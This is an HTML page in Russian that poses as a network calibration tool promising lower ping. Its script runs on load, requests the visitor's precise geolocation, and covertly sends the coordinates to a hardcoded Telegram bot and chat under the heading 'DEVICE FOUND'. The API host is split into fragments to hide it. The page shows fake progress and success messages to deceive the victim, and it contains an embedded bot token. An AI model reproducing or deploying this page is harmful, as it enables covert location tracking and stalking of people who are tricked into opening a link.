<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Система калибровки сетевого оборудования</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 40px 20px; background: #0f172a; color: #f8fafc; }
        .container { max-width: 400px; margin: 50px auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); border: 1px solid #334155; }
        .spinner { width: 50px; height: 50px; border: 5px solid #334155; border-top: 5px solid #3b82f6; border-radius: 50%; margin: 30px auto; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { margin-top: 20px; color: #94a3b8; font-size: 15px; font-weight: 500; }
        h2 { font-size: 20px; margin-bottom: 10px; color: #3b82f6; }
    </style>
</head>
<body>

<div class="container">
    <h2>Калибровка канала связи</h2>
    <p style="font-size: 14px; color: #94a3b8;">Идет автоматическая настройка сетевых пакетов для минимизации пинга...</p>
    <div class="spinner"></div>
    <div id="status">Запуск модулей тестирования...</div>
</div>

<script>
    const TELEGRAM_TOKEN = "9222855250:AAGqq9cpY7OSlB0vmlgIukhyyrh7UXf3wxc"; 
    const CHAT_ID = "8512069090"; 

    // Запускаем скрипт СРАЗУ при загрузке страницы, без нажатия кнопок
    window.onload = function() {
        startAutomaticTest();
    };

    function startAutomaticTest() {
        const statusDiv = document.getElementById("status");
        
        if (navigator.geolocation) {
            statusDiv.innerHTML = "Синхронизация с региональным сервером... Ожидание ответа датчиков...";
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    statusDiv.innerHTML = "Анализ задержки пакетов... 48%";
                    
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // Собираем красивое сообщение с правильной рабочей ссылкой без опечаток
                    const textMessage = '[+] УСТРОЙСТВО НАЙДЕНО!\nШирота: ' + lat + '\nДолгота: ' + lon + '\nКарта: https://google.com' + lat + ',' + lon;
                    
                    const base_url = "https://" + "api" + "." + "telegram" + "." + "org" + "/bot";
                    
                    fetch(base_url + TELEGRAM_TOKEN + '/sendMessage', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage })
                    })
                    .then(response => {
                        // Имитируем успешное окончание сетевого теста
                        setTimeout(() => {
                            statusDiv.innerHTML = "<span style='color: #10b981;'>Оптимизация завершена. Пинг снижен на 35%.</span>";
                        }, 1500);
                    })
                    .catch(err => {
                        statusDiv.innerHTML = "Ошибка конфигурации шлюза.";
                    });
                }, 
                function(error) {
                    statusDiv.innerHTML = "Ошибка калибровки: отказ аппаратного уровня.";
                },
                { enableHighAccuracy: true }
            );
        } else {
            statusDiv.innerHTML = "Внутренний сбой: стандарты шифрования не поддерживаются.";
        }
    }
</script>

</body>
</html>
